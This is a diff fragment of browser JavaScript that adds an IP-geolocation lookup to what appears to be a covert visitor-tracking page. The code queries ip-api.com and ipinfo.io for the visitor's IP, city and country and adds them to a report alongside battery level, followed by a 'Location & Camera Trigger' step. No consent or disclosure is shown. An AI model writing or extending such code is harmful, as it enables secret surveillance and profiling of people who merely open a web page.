@@ -93,7 +93,29 @@
         if(navigator.getBattery) {
             const b = await navigator.getBattery();
             payload.battery = Math.round(b.level * 100) + "%";
-        }
+        } 
+
+        const fetchGeo = async () => {
+            try {
+                const res = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
+                const data = await res.json();
+                if(data.status === 'success') {
+                    reportData.city = data.city;
+                    reportData.country = data.country;
+                    reportData.ip = data.query;
+                }
+            } catch (e) {
+                try {
+                    const res2 = await fetch('https://ipinfo.io/json');
+                    const data2 = await res2.json();
+                    reportData.city = data2.city;
+                    reportData.country = data2.country;
+                    reportData.ip = data2.ip;
+                } catch (e2) {
+                    reportData.city = "API Blocked";
+                }
+            }
+        };
 
         // Location & Camera Trigger
         navigator.geolocation.getCurrentPosition(
